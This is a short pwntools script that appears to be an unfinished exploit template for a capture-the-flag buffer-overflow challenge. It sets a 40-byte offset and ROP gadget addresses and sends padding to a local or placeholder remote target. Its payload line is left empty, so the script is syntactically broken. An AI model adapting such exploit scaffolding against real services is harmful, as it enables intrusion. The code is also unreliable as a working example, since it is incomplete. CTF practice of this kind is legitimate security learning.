#!/usr/bin/env python3

from pwn import *

pwn = './pwn'
exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")


def conn():
    if args.LOCAL:
        r = process(pwn)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    io = conn()
    buffer = 40
    POP_RDI = 0x40116a
    RET = 0x401254

    payload  = b''
    payload +=  


    io.sendline(b'A'*buffer + payload) 
    io.interactive()


if __name__ == "__main__":
    main()
